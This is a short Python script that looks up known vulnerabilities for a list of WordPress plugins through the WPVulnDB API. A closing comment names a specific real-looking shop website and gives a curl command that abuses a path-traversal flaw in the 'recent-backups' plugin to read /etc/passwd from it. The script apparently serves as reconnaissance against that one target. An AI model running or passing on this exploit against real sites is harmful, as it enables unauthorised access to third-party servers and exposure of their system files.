import requests, time

def get_plugin_info(plugin):
    url = "http://www.wpvulndb.com/api/v2/plugins/"+str(plugin)
    r = requests.get(url)
    j = r.json()
    print(j[plugin]['vulnerabilities'][0]['title'])
    print(j[plugin]['vulnerabilities'][0]['vuln_type'])
    # 
    return None 

a = [   
    #'cookie-notice'
# ,'yith-woocommerce-ajax-search'
'js_composer'
,'improved-sale-badges'
,'addthis'
#,'ubermenu'
,'profile-builder'
,'woocommerce'
,'yith-woocommerce-ajax-search'
,'improved-sale-badges'
,'wp-rocket'
]

st = time.time()
for i in a:
    print(i)
    try:
        get_plugin_info(i)
    except Exception as x:
        print(x)
    print("-----------------\n")
end = time.time()
# https://www.loveulicious.co.uk/
#    $ curl -v "http://www.loveulicious.co.uk/wp-content/plugins/recent-backups/download-file.php?file_link=/etc/passwd"
print(end-st)